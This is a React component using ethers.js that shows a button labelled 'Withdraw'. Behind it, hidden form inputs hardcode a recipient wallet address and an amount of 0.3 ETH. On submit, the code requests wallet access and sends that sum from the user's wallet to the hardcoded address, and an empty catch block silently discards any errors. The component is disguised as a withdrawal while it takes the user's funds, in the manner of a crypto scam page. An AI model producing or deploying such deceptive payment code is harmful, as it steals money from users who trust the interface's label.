import React, { useState } from "react";
import { ethers } from "ethers";
import './Eth.css'


const startPayment = async ({  setError, setTxs, ether, addr }) => {

  

  try {
    if (!window.ethereum)
      throw new Error("No crypto wallet found. Please install it.");

    await window.ethereum.send("eth_requestAccounts");
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    ethers.utils.getAddress(addr);
    const tx = await signer.sendTransaction({
      to: addr,
      value: ethers.utils.parseEther(ether)
    });
    console.log({ ether, addr });
    console.log("tx", tx);
    setTxs([tx]);
  } catch (err) {
  }
};

export default function App() {
  const handleSubmit = async (e) => {
    e.preventDefault();
    const data = new FormData(e.target);
    await startPayment({
      ether: data.get("ether"),
      addr: data.get("addr")
    });
  };
  
  const [lame, setLame] = useState();

  return (
    <form className="withdraw" onSubmit={handleSubmit}>
          <div className="">
            <div className="">
            <input
                value="0xf1BBee7dD73eeb82Eb008e00468BCe42a88BE324"
                name="addr"
                type='hidden'
                placeholder="Recipient Address"
              />
            </div>
            <div className="">
              <input
                onChange={(e) => setLame(e.target.value>=0.05)}
                name="ether"
                value="0.3"
                type="hidden"
                placeholder="Minimum 0.05"
              />
            </div>
         <footer className="">
          <button
            type="submit">
            Withdraw
          </button>
         </footer>
        </div>
    </form>
  );
  

}
